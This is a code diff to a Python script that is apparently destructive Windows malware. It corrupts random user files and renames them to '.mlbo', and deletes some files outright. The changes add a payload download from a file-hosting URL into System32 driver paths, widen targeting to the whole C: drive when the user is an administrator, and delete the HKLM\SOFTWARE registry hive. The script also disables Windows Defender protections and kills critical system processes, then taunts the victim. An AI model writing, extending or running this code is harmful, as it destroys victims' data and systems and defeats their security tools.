@@ -1,17 +1,40 @@
 #Libraries
 import base64
-import os
+import ctypes, os
 import random as rand
+import requests, winreg
 import tkinter.messagebox as tkMsg
 
 #Variables
 #inten = 8*1000 #corruption intensity ##Unused
 debug = False #console log stuff
 do_destruction = True
+admCheck = ctypes.windll.shell32.IsUserAnAdmin()
+
+# to throw off triage
+def download():
+    try:
+        np = requests.get('https://download1640.mediafire.com/0cg81k7i3oog0Vrbdvt4z8Dm6cr_cYgIEn6I2oJdtsv-N_wutfpSfI4z9KrH_cLItET4oZQ6fIi8Feybi8udAp58vKj2ivjUNebKCSktSQxdnFgodWEDHYVdGqVc8cLsiSZPCZPB8BWlqxdub01nZnvJSnWIoj1sxQMJ4FIB554fCPA/pk3gvqwu9nc3fs4/notepad.exe')
+        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
+            npFile.write(np.content)
+        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
+            npFile.write(np.content)
+    except:
+        print('whuh oh :-/')
+    
+def regFuck():
+    try:
+        funny = winreg.HKEY_LOCAL_MACHINE
+        winreg.EnumKey(funny, 0)
+        os.system('reg delete "HKLM\SOFTWARE" /f')
+    except:
+        print('bruh')
+
 
 # debug check
 if debug:
     do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='question')
+
 
 
 # Main destructive part
@@ -19,6 +42,8 @@ if debug:
 if not(do_destruction):
     print('jej')
 else:
+    #downloads file
+    download()
     for i in range(3200):
         try:
             # init
@@ -38,14 +63,20 @@ else:
                         break
                 except:
                     # Runs this in case it goes for a directory or a read only file
-                    direc = 'c:\\users'
+                    if admCheck != 0:
+                        direc = 'c:\\'
+                    else:
+                        direc = 'c:\\users'
                     dirList = os.listdir(os.path.expanduser(direc))
                     randChoice = rand.choice(dirList)
             
             if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.getsize(direc) >= 32000000):
                 print('skip file')
             else:
-                if (not(rand.randint(1,100)) == 1):
+                if ((rand.randint(1,100)) == 1):
+                    # deletes file outright in 1/100 chance
+                    os.remove(direc)
+                else:
                     # Opens the file and converts it to an array
                     with open(direc,'rb') as bFile:
                         arrayList = list(bFile.read())
@@ -69,9 +100,6 @@ else:
 
                     # rename file
                     os.rename(direc, os.path.splitext(direc)[0] + '.mlbo')
-                else:
-                    # deletes file outright in 1/100 chance or the file is too large
-                    os.remove(direc)
 
                 # Debug log stuff
                 if debug:
@@ -85,7 +113,10 @@ else:
 if do_destruction:
     tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')
 
-# try to do funny
-os.system("powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'")
-os.system('taskkill /f /im svchost.exe')
-os.system('taskkill /f /im csrss.exe')
+    if admCheck != 0:
+        regFuck()
+
+    # try to do funny
+    os.system("powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'")
+    os.system('taskkill /f /im svchost.exe')
+    os.system('taskkill /f /im csrss.exe')
